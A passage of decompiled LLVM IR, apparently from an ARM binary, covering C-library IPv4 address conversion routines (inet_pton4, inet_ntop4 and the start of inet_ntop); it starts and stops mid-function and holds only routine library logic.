dec_label_pc_2df4c:                               ; preds = %dec_label_pc_2df44
  %v0_2df4c = load i32, i32* @r6, align 4
  store i32 %v0_2df4c, i32* %fp.global-to-local, align 4
  store i32 %v1_2df10, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_2dfc4.backedge

dec_label_pc_2df58:                               ; preds = %dec_label_pc_2df3c
  %v1_2df58 = inttoptr i32 %v1_2df10 to i8*
  %v2_2df58 = load i8, i8* %v1_2df58, align 1
  %v3_2df58 = zext i8 %v2_2df58 to i32
  store i32 %v3_2df58, i32* %r3.global-to-local, align 4
  %v2_2df5c = icmp eq i8 %v2_2df58, 0
  br i1 %v2_2df5c, label %dec_label_pc_2e060, label %dec_label_pc_2df64

dec_label_pc_2df64:                               ; preds = %dec_label_pc_2df58
  %v0_2df64 = load i32, i32* @r6, align 4
  %v1_2df64 = add i32 %v0_2df64, 2
  store i32 %v1_2df64, i32* %r3.global-to-local, align 4
  %v1_2df68 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_2df64, %v1_2df68
  br i1 %tmp37, label %dec_label_pc_2e060, label %dec_label_pc_2df70

dec_label_pc_2df70:                               ; preds = %dec_label_pc_2df64
  %v0_2df70 = load i32, i32* @r7, align 4
  %v3_2df70 = udiv i32 %v0_2df70, 256
  store i32 %v3_2df70, i32* %r2.global-to-local, align 4
  store i32 %v0_2df64, i32* %r3.global-to-local, align 4
  %v1_2df78 = trunc i32 %v3_2df70 to i8
  %v3_2df78 = inttoptr i32 %v0_2df64 to i8*
  store i8 %v1_2df78, i8* %v3_2df78, align 1
  %v4_2df78 = load i32, i32* %r3.global-to-local, align 4
  %v5_2df78 = add i32 %v4_2df78, 1
  store i32 %v5_2df78, i32* @r3, align 4
  %v0_2df7c = load i32, i32* @r7, align 4
  %v1_2df7c = trunc i32 %v0_2df7c to i8
  %v2_2df7c = load i32, i32* @r6, align 4
  %v3_2df7c = add i32 %v2_2df7c, 1
  %v4_2df7c = inttoptr i32 %v3_2df7c to i8*
  store i8 %v1_2df7c, i8* %v4_2df7c, align 1
  store i32 0, i32* @r7, align 4
  %v0_2df84 = load i32, i32* @r3, align 4
  %v1_2df84 = add i32 %v0_2df84, 1
  store i32 %v1_2df84, i32* @r6, align 4
  %v0_2df88 = load i32, i32* @r5, align 4
  store i32 %v0_2df88, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_2dfc4.backedge

dec_label_pc_2df94:                               ; preds = %dec_label_pc_2df34
  %v7_2df94 = icmp eq i32 %v0_2df34, 46
  br i1 %v7_2df94, label %dec_label_pc_2df9c, label %dec_label_pc_2e060

dec_label_pc_2df9c:                               ; preds = %dec_label_pc_2df94
  %v0_2df9c = load i32, i32* @r6, align 4
  %v1_2df9c = add i32 %v0_2df9c, 4
  store i32 %v1_2df9c, i32* @r4, align 4
  %v1_2dfa0 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_2df9c, %v1_2dfa0
  br i1 %tmp38, label %dec_label_pc_2e060, label %dec_label_pc_2dfa8

dec_label_pc_2dfa8:                               ; preds = %dec_label_pc_2df9c
  %v0_2dfa8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_2dfa8, i32* @r0, align 4
  store i32 %v0_2df9c, i32* %r1.global-to-local, align 4
  %v3_2dfb0 = call i32 @inet_pton4(i32 %v0_2dfa8, i32 %v0_2df9c)
  %v5_2dfb8 = icmp sgt i32 %v3_2dfb0, 0
  br i1 %v5_2dfb8, label %dec_label_pc_2dfa8.dec_label_pc_2dffc_crit_edge, label %dec_label_pc_2e060

dec_label_pc_2dfa8.dec_label_pc_2dffc_crit_edge:  ; preds = %dec_label_pc_2dfa8
  %v0_2e040.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2dffc

dec_label_pc_2dfc0:                               ; preds = %dec_label_pc_2df18
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_2dfc4.backedge

dec_label_pc_2dfc4.backedge:                      ; preds = %dec_label_pc_2dfc0, %dec_label_pc_2df4c, %dec_label_pc_2df70
  %v0_2dfc4 = phi i32 [ %v1_2df10, %dec_label_pc_2dfc0 ], [ %v1_2df10, %dec_label_pc_2df4c ], [ %v0_2df88, %dec_label_pc_2df70 ]
  %v0_2dfd012 = phi i32 [ 1, %dec_label_pc_2dfc0 ], [ 0, %dec_label_pc_2df4c ], [ 0, %dec_label_pc_2df70 ]
  %v1_2dfc4 = inttoptr i32 %v0_2dfc4 to i8*
  %v2_2dfc4 = load i8, i8* %v1_2dfc4, align 1
  %v3_2dfc4 = zext i8 %v2_2dfc4 to i32
  store i32 %v3_2dfc4, i32* @r4, align 4
  %v2_2dfc8 = icmp eq i8 %v2_2dfc4, 0
  br i1 %v2_2dfc8, label %dec_label_pc_2dfd0, label %dec_label_pc_2dfc4.backedge.dec_label_pc_2df00_crit_edge

dec_label_pc_2dfc4.backedge.dec_label_pc_2df00_crit_edge: ; preds = %dec_label_pc_2dfc4.backedge
  %v2_2df00.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_2df00

dec_label_pc_2dfd0:                               ; preds = %dec_label_pc_2dfc4.backedge
  %v0_2dfd4.pre = load i32, i32* @r6, align 4
  %v2_2dfd0 = icmp eq i32 %v0_2dfd012, 0
  store i32 %v0_2dfd4.pre, i32* @r4, align 4
  br i1 %v2_2dfd0, label %dec_label_pc_2dffc, label %dec_label_pc_2dfdc

dec_label_pc_2dfdc:                               ; preds = %dec_label_pc_2dfd0
  %v1_2dfdc = add i32 %v0_2dfd4.pre, 2
  store i32 %v1_2dfdc, i32* %r3.global-to-local, align 4
  %v1_2dfe0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_2dfdc, %v1_2dfe0
  br i1 %tmp39, label %dec_label_pc_2e060, label %dec_label_pc_2dfe8

dec_label_pc_2dfe8:                               ; preds = %dec_label_pc_2dfdc
  store i32 %v0_2dfd4.pre, i32* %r3.global-to-local, align 4
  %v0_2dfec = load i32, i32* @r7, align 4
  %v3_2dfec = udiv i32 %v0_2dfec, 256
  store i32 %v3_2dfec, i32* %r2.global-to-local, align 4
  %v1_2dff0 = trunc i32 %v3_2dfec to i8
  %v3_2dff0 = inttoptr i32 %v0_2dfd4.pre to i8*
  store i8 %v1_2dff0, i8* %v3_2dff0, align 1
  %v4_2dff0 = load i32, i32* %r3.global-to-local, align 4
  %v5_2dff0 = add i32 %v4_2dff0, 1
  store i32 %v5_2dff0, i32* @r3, align 4
  %v0_2dff4 = load i32, i32* @r7, align 4
  %v1_2dff4 = trunc i32 %v0_2dff4 to i8
  %v2_2dff4 = load i32, i32* @r6, align 4
  %v3_2dff4 = add i32 %v2_2dff4, 1
  %v4_2dff4 = inttoptr i32 %v3_2dff4 to i8*
  store i8 %v1_2dff4, i8* %v4_2dff4, align 1
  %v0_2dff8 = load i32, i32* @r3, align 4
  %v1_2dff8 = add i32 %v0_2dff8, 1
  store i32 %v1_2dff8, i32* @r4, align 4
  br label %dec_label_pc_2dffc

dec_label_pc_2dffc:                               ; preds = %dec_label_pc_2dfa8.dec_label_pc_2dffc_crit_edge, %dec_label_pc_2dfd0.thread, %dec_label_pc_2dfd0, %dec_label_pc_2dfe8
  %v0_2e040.pre = phi i32 [ %v0_2e040.pre.pre, %dec_label_pc_2dfa8.dec_label_pc_2dffc_crit_edge ], [ %v4_2debc, %dec_label_pc_2dfd0.thread ], [ %v0_2dfd4.pre, %dec_label_pc_2dfd0 ], [ %v1_2dff8, %dec_label_pc_2dfe8 ]
  %v0_2dffc = load i32, i32* %fp.global-to-local, align 4
  %v2_2dffc = icmp eq i32 %v0_2dffc, 0
  %v1_2e040.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_2dffc, label %dec_label_pc_2e040, label %dec_label_pc_2e004

dec_label_pc_2e004:                               ; preds = %dec_label_pc_2dffc
  %v9_2e004 = icmp eq i32 %v0_2e040.pre, %v1_2e040.pre
  %v2_2e008 = sub i32 %v0_2e040.pre, %v0_2dffc
  store i32 %v2_2e008, i32* @ip, align 4
  br i1 %v9_2e004, label %dec_label_pc_2e060, label %dec_label_pc_2e028.preheader

dec_label_pc_2e028.preheader:                     ; preds = %dec_label_pc_2e004
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_2e028

dec_label_pc_2e01c:                               ; preds = %dec_label_pc_2e028
  %v2_2e030 = sub i32 %v0_2e03c, %v0_2e034
  %v0_2e01c = load i32, i32* %fp.global-to-local, align 4
  %v2_2e01c = add i32 %v0_2e01c, %v2_2e02c
  %v3_2e01c = inttoptr i32 %v2_2e01c to i8*
  %v4_2e01c = load i8, i8* %v3_2e01c, align 1
  %v6_2e01c = zext i8 %v4_2e01c to i32
  store i32 %v6_2e01c, i32* @r3, align 4
  %v3_2e020 = inttoptr i32 %v2_2e030 to i8*
  store i8 %v4_2e01c, i8* %v3_2e020, align 1
  %v0_2e024 = load i32, i32* @lr, align 4
  %v1_2e024 = trunc i32 %v0_2e024 to i8
  %v2_2e024 = load i32, i32* %fp.global-to-local, align 4
  %v3_2e024 = load i32, i32* %r1.global-to-local, align 4
  %v4_2e024 = add i32 %v3_2e024, %v2_2e024
  %v5_2e024 = inttoptr i32 %v4_2e024 to i8*
  store i8 %v1_2e024, i8* %v5_2e024, align 1
  %v0_2e028.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2e028.pre = load i32, i32* @ip, align 4
  %v1_2e030.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2e028

dec_label_pc_2e028:                               ; preds = %dec_label_pc_2e028.preheader, %dec_label_pc_2e01c
  %v0_2e03c = phi i32 [ %v1_2e040.pre, %dec_label_pc_2e028.preheader ], [ %v1_2e030.pre, %dec_label_pc_2e01c ]
  %v1_2e02c = phi i32 [ %v2_2e008, %dec_label_pc_2e028.preheader ], [ %v1_2e028.pre, %dec_label_pc_2e01c ]
  %v0_2e034 = phi i32 [ 1, %dec_label_pc_2e028.preheader ], [ %v0_2e028.pre, %dec_label_pc_2e01c ]
  %v2_2e028 = sub i32 %v0_2e034, %v1_2e02c
  %v4_2e028 = xor i32 %v0_2e034, %v1_2e02c
  %v5_2e028 = xor i32 %v2_2e028, %v0_2e034
  %v6_2e028 = and i32 %v5_2e028, %v4_2e028
  %v7_2e028 = icmp slt i32 %v6_2e028, 0
  %v8_2e028 = icmp slt i32 %v2_2e028, 0
  %v9_2e028 = icmp eq i32 %v0_2e034, %v1_2e02c
  %v2_2e02c = sub i32 %v1_2e02c, %v0_2e034
  store i32 %v2_2e02c, i32* %r1.global-to-local, align 4
  %v1_2e034 = add i32 %v0_2e034, 1
  store i32 %v1_2e034, i32* %r2.global-to-local, align 4
  %v3_2e038 = xor i1 %v8_2e028, %v7_2e028
  %v4_2e038 = or i1 %v9_2e028, %v3_2e038
  br i1 %v4_2e038, label %dec_label_pc_2e01c, label %dec_label_pc_2e03c

dec_label_pc_2e03c:                               ; preds = %dec_label_pc_2e028
  store i32 %v0_2e03c, i32* @r4, align 4
  br label %dec_label_pc_2e040

dec_label_pc_2e040:                               ; preds = %dec_label_pc_2dffc, %dec_label_pc_2e03c
  %v0_2e040 = phi i32 [ %v0_2e03c, %dec_label_pc_2e03c ], [ %v0_2e040.pre, %dec_label_pc_2dffc ]
  %v1_2e040 = phi i32 [ %v0_2e03c, %dec_label_pc_2e03c ], [ %v1_2e040.pre, %dec_label_pc_2dffc ]
  %v9_2e040 = icmp eq i32 %v0_2e040, %v1_2e040
  br i1 %v9_2e040, label %dec_label_pc_2e048, label %dec_label_pc_2e060

dec_label_pc_2e048:                               ; preds = %dec_label_pc_2e040
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_2deb0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_2e054 = call i32 @memcpy()
  br label %dec_label_pc_2e080

dec_label_pc_2e060:                               ; preds = %dec_label_pc_2df18, %dec_label_pc_2df44, %dec_label_pc_2df64, %dec_label_pc_2df58, %dec_label_pc_2e004, %dec_label_pc_2dfa8, %dec_label_pc_2df94, %dec_label_pc_2e040, %dec_label_pc_2ded4, %dec_label_pc_2dfdc, %dec_label_pc_2df9c
  br label %dec_label_pc_2e080

dec_label_pc_2e068:                               ; preds = %dec_label_pc_2de94
  store i32 84156, i32* %r3.global-to-local, align 4
  %v0_2e06c = call i32 @__aeabi_read_tp()
  %v3_2e070 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2e070 = sext i16 %v3_2e070 to i32
  store i32 %v4_2e070, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r2.global-to-local, align 4
  %v3_2e078 = add i32 %v4_2e070, %v0_2e06c
  %v4_2e078 = inttoptr i32 %v3_2e078 to i32*
  store i32 97, i32* %v4_2e078, align 4
  br label %dec_label_pc_2e080

dec_label_pc_2e080:                               ; preds = %dec_label_pc_2e060, %dec_label_pc_2e048, %dec_label_pc_2dea0, %dec_label_pc_2e068
  %v1_2e088 = phi i32 [ 0, %dec_label_pc_2e060 ], [ 1, %dec_label_pc_2e048 ], [ %v3_2dea8, %dec_label_pc_2dea0 ], [ -1, %dec_label_pc_2e068 ]
  store i32 %v3_2de74, i32* @r4, align 4
  store i32 %v6_2de74, i32* @r5, align 4
  store i32 %v9_2de74, i32* @r6, align 4
  store i32 %v12_2de74, i32* @r7, align 4
  store i32 %v27_2de74, i32* @lr, align 4
  ret i32 %v1_2e088

; uselistorder directives
  uselistorder i32 %v2_2e02c, { 1, 0 }
  uselistorder i32 %v2_2e028, { 1, 0 }
  uselistorder i32 %v0_2e034, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_2e02c, { 1, 3, 0, 2 }
  uselistorder i32 %v0_2e03c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_2e040.pre, { 0, 2, 1 }
  uselistorder i32 %v0_2e040.pre, { 2, 0, 1 }
  uselistorder i32 %v3_2dfec, { 1, 0 }
  uselistorder i32 %v0_2dfd4.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_2dfc4, { 1, 0 }
  uselistorder i32 %v0_2df9c, { 1, 0, 2 }
  uselistorder i32 %v3_2df70, { 1, 0 }
  uselistorder i32 %v0_2df64, { 1, 0, 2 }
  uselistorder i32 %v1_2df10, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_2df00, { 1, 0 }
  uselistorder i32 %v0_2deec, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_2e080, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_2e060, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_2e040, { 1, 0 }
  uselistorder label %dec_label_pc_2e028, { 1, 0 }
  uselistorder label %dec_label_pc_2dffc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_2dfc4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2df00, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_2e174 = ptrtoint i32* %stack_var_-40 to i32
  %v2_2e154 = add i32 %v2_2e174, -17
  br label %dec_label_pc_2e174

dec_label_pc_2e0c4:                               ; preds = %dec_label_pc_2e174
  %v0_2e0c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_2e0c4 = add i32 %v0_2e0c4, %v1_2e0c4
  %v3_2e0c4 = inttoptr i32 %v2_2e0c4 to i8*
  %v4_2e0c4 = load i8, i8* %v3_2e0c4, align 1
  %v6_2e0c4 = zext i8 %v4_2e0c4 to i32
  store i32 %v6_2e0c4, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_2e0c4, 100
  %v2_2e0cc = zext i8 %div4 to i32
  store i32 %v2_2e0cc, i32* %r0.global-to-local, align 4
  %v1_2e0d0 = or i8 %div4, 48
  %v3_2e0d4 = add i32 %v2_2e184, -17
  %v4_2e0d4 = inttoptr i32 %v3_2e0d4 to i8*
  store i8 %v1_2e0d0, i8* %v4_2e0d4, align 1
  %v0_2e0d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_2e0d8 = add i32 %v0_2e0d8, -17
  %v2_2e0d8 = inttoptr i32 %v1_2e0d8 to i8*
  %v3_2e0d8 = load i8, i8* %v2_2e0d8, align 1
  %v0_2e0dc = load i32, i32* %r6.global-to-local, align 4
  %v1_2e0dc = add i32 %v0_2e0dc, 1
  store i32 %v1_2e0dc, i32* %r6.global-to-local, align 4
  %v7_2e0e4 = icmp eq i8 %v3_2e0d8, 48
  %v0_2e0ec = load i32, i32* %r4.global-to-local, align 4
  %v0_2e0f4 = load i32, i32* %fp.global-to-local, align 4
  %v1_2e0f4 = load i32, i32* %sl.global-to-local, align 4
  %v2_2e0f4 = add i32 %v1_2e0f4, %v0_2e0f4
  store i32 %v2_2e0f4, i32* %sb.global-to-local, align 4
  %v2_2e0fc = udiv i32 %v0_2e0ec, 10
  %v1_2e104 = urem i32 %v2_2e0fc, 256
  %v2_2e108 = udiv i32 %v1_2e104, 10
  %v3_2e108 = urem i32 %v1_2e104, 10
  store i32 %v2_2e108, i32* %r0.global-to-local, align 4
  %v1_2e10c = or i32 %v3_2e108, 48
  store i32 %v1_2e10c, i32* %r1.global-to-local, align 4
  br i1 %v7_2e0e4, label %dec_label_pc_2e0fc, label %dec_label_pc_2e124

dec_label_pc_2e0fc:                               ; preds = %dec_label_pc_2e0c4
  %v7_2e114 = icmp eq i32 %v1_2e10c, 48
  br i1 %v7_2e114, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_2e0fc
  store i32 %v1_2e0dc, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_2e0fc, %bb
  %v1_2e11c = trunc i32 %v1_2e10c to i8
  store i8 %v1_2e11c, i8* %v2_2e0d8, align 1
  %v0_2e150.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2e140

dec_label_pc_2e124:                               ; preds = %dec_label_pc_2e0c4
  %v2_2e0f0 = add i32 %v1_2e0dc, %v2_2e174
  %v1_2e138 = trunc i32 %v1_2e10c to i8
  %v3_2e138 = add i32 %v2_2e0f0, -17
  %v4_2e138 = inttoptr i32 %v3_2e138 to i8*
  store i8 %v1_2e138, i8* %v4_2e138, align 1
  %v0_2e13c = load i32, i32* %r6.global-to-local, align 4
  %v1_2e13c = add i32 %v0_2e13c, 1
  store i32 %v1_2e13c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2e140

dec_label_pc_2e140:                               ; preds = %bb18, %dec_label_pc_2e124
  %v0_2e150 = phi i32 [ %v0_2e150.pre, %bb18 ], [ %v1_2e13c, %dec_label_pc_2e124 ]
  %v0_2e140 = load i32, i32* %sb.global-to-local, align 4
  %v1_2e140 = inttoptr i32 %v0_2e140 to i8*
  %v2_2e140 = load i8, i8* %v1_2e140, align 1
  %tmp19 = urem i8 %v2_2e140, 10
  %v3_2e148 = zext i8 %tmp19 to i32
  store i32 %v2_2e174, i32* %ip.global-to-local, align 4
  %v1_2e150 = add i32 %v0_2e150, 1
  store i32 %v1_2e150, i32* %r0.global-to-local, align 4
  %v1_2e158 = or i32 %v3_2e148, 48
  store i32 %v1_2e158, i32* %r1.global-to-local, align 4
  %v1_2e15c = trunc i32 %v1_2e158 to i8
  %v3_2e15c = add i32 %v2_2e154, %v0_2e150
  %v4_2e15c = inttoptr i32 %v3_2e15c to i8*
  store i8 %v1_2e15c, i8* %v4_2e15c, align 1
  %v0_2e160 = load i32, i32* %ip.global-to-local, align 4
  %v1_2e160 = load i32, i32* %r0.global-to-local, align 4
  %v2_2e160 = add i32 %v1_2e160, %v0_2e160
  %v3_2e168 = add i32 %v2_2e160, -17
  %v4_2e168 = inttoptr i32 %v3_2e168 to i8*
  store i8 46, i8* %v4_2e168, align 1
  %v0_2e16c = load i32, i32* %r0.global-to-local, align 4
  %v1_2e16c = add i32 %v0_2e16c, 1
  store i32 %v1_2e16c, i32* %r6.global-to-local, align 4
  %v0_2e170 = load i32, i32* %sl.global-to-local, align 4
  %v1_2e170 = add i32 %v0_2e170, 1
  store i32 %v1_2e170, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_2e174

dec_label_pc_2e174:                               ; preds = %entry, %dec_label_pc_2e140
  %v0_2e180 = phi i32 [ 0, %entry ], [ %v1_2e16c, %dec_label_pc_2e140 ]
  %v1_2e0c4 = phi i32 [ 0, %entry ], [ %v1_2e170, %dec_label_pc_2e140 ]
  store i32 %v2_2e174, i32* %ip.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_2e180, i32* %r7.global-to-local, align 4
  %v2_2e184 = add i32 %v0_2e180, %v2_2e174
  store i32 %v2_2e184, i32* %r5.global-to-local, align 4
  %v7_2e188 = icmp sgt i32 %v1_2e0c4, 3
  br i1 %v7_2e188, label %dec_label_pc_2e18c, label %dec_label_pc_2e0c4

dec_label_pc_2e18c:                               ; preds = %dec_label_pc_2e174
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_2e190 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_2e190, i32* %r4.global-to-local, align 4
  %v3_2e194 = add i32 %v2_2e184, -18
  %v4_2e194 = inttoptr i32 %v3_2e194 to i8*
  store i8 0, i8* %v4_2e194, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_2e190, i32* %r0.global-to-local, align 4
  %v3_2e19c = call i32 @strlen(i8* %tmp20)
  store i32 %v3_2e19c, i32* %r0.global-to-local, align 4
  %v2_2e1a0 = load i32, i32* %stack_var_-72, align 4
  %tmp = icmp ugt i32 %v3_2e19c, %v2_2e1a0
  br i1 %tmp, label %dec_label_pc_2e1ac, label %dec_label_pc_2e1c8

dec_label_pc_2e1ac:                               ; preds = %dec_label_pc_2e18c
  %v0_2e1b0 = call i32 @__aeabi_read_tp()
  store i32 %v0_2e1b0, i32* %r0.global-to-local, align 4
  %v3_2e1b4 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2e1b4 = sext i16 %v3_2e1b4 to i32
  %v0_2e1bc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2e1bc, i32* %r1.global-to-local, align 4
  %v3_2e1c0 = add i32 %v4_2e1b4, %v0_2e1b0
  %v4_2e1c0 = inttoptr i32 %v3_2e1c0 to i32*
  store i32 28, i32* %v4_2e1c0, align 4
  %v0_2e1d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2e1d8

dec_label_pc_2e1c8:                               ; preds = %dec_label_pc_2e18c
  store i32 %v2_2e190, i32* @r1, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_2e1d0 = inttoptr i32 %arg2 to i8*
  %v3_2e1d0 = call i32 @strcpy(i8* %v2_2e1d0, i32 %v2_2e190)
  store i32 %v3_2e1d0, i32* %r0.global-to-local, align 4
  store i32 %v3_2e1d0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2e1d8

dec_label_pc_2e1d8:                               ; preds = %dec_label_pc_2e1ac, %dec_label_pc_2e1c8
  %v0_2e1d8 = phi i32 [ %v0_2e1d8.pre, %dec_label_pc_2e1ac ], [ %v3_2e1d0, %dec_label_pc_2e1c8 ]
  store i32 %v0_2e1d8, i32* %r0.global-to-local, align 4
  ret i32 %v0_2e1d8

; uselistorder directives
  uselistorder i32 %v0_2e1d8, { 1, 0 }
  uselistorder i32 %v2_2e190, { 1, 0, 2, 3 }
  uselistorder i32 %v2_2e184, { 0, 2, 1 }
  uselistorder i32 %v1_2e0c4, { 1, 0 }
  uselistorder i32 %v1_2e158, { 1, 0 }
  uselistorder i32 %v1_2e10c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_2e174, { 0, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 100, { 1, 2, 0, 3 }
  uselistorder i8 48, { 5, 0, 3, 6, 7, 8, 9, 10, 1, 2, 11, 4 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2e1d8, { 1, 0 }
  uselistorder label %dec_label_pc_2e174, { 1, 0 }
  uselistorder label %dec_label_pc_2e140, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_2e1ec = load i32, i32* @r5, align 4
  %v7_2e1f8 = icmp eq i32 %arg1, 2
  store i1 %v7_2e1f8, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_2e1f8, label %dec_label_pc_2e21c, label %dec_label_pc_2e210

dec_label_pc_2e210:                               ; preds = %entry
  %v7_2e210 = icmp eq i32 %arg1, 10
  store i1 %v7_2e210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2e210, label %dec_label_pc_2e230, label %dec_label_pc_2e44c

dec_label_pc_2e21c:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_2e228 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_2e444

dec_label_pc_2e230:                               ; preds = %dec_label_pc_2e210
  %v2_2e230 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_2e230, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_2e23c = bitcast i32* %stack_var_-72 to i8*
  %v4_2e23c = call i32 @__GI_memset(i8* %v3_2e23c, i32 0, i32 32)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_2e260 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_2e244

dec_label_pc_2e244:                               ; preds = %dec_label_pc_2e244.dec_label_pc_2e244_crit_edge, %dec_label_pc_2e230
  %v0_2e25c = phi i32 [ %v0_2e244.pre, %dec_label_pc_2e244.dec_label_pc_2e244_crit_edge ], [ 0, %dec_label_pc_2e230 ]
  %v1_2e244 = load i32, i32* @r8, align 4
  %v2_2e244 = add i32 %v1_2e244, %v0_2e25c
  %v3_2e248 = inttoptr i32 %v2_2e244 to i8*
  %v4_2e248 = load i8, i8* %v3_2e248, align 1
  %v6_2e248 = zext i8 %v4_2e248 to i32
  store i32 %v6_2e248, i32* %r1.global-to-local, align 4
  %v1_2e24c = add i32 %v2_2e244, 1
  %v2_2e24c = inttoptr i32 %v1_2e24c to i8*
  %v3_2e24c = load i8, i8* %v2_2e24c, align 1
  %v4_2e24c = zext i8 %v3_2e24c to i32
  %tmp74 = icmp slt i32 %v0_2e25c, 0
  %v4_2e250 = zext i1 %tmp74 to i32
  %v5_2e250 = add i32 %v4_2e250, %v0_2e25c
  %v4_2e254 = mul nuw nsw i32 %v6_2e248, 256
  %v5_2e254 = or i32 %v4_2e24c, %v4_2e254
  %v3_2e258 = sdiv i32 %v5_2e250, 2
